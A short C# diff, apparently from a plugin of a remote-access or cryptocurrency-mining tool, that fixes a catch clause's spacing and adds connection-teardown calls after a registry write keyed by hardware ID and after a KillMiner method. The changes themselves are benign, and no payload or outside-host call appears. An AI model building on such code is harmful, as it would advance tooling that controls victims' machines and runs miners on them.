@@ -66,10 +66,11 @@ namespace Plugin.Handler
                     SetRegistry.SetValue(Connection.Hwid, "1");
                 }
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
                 Packet.Error(ex.Message);
             }
+            Connection.Disconnected();
         }
 
         public void KillMiner()
@@ -86,6 +87,7 @@ namespace Plugin.Handler
                 }
                 catch{ }
             }
+            Connection.Disconnected();
         }
 
         public string GetCommandLine(Process process)
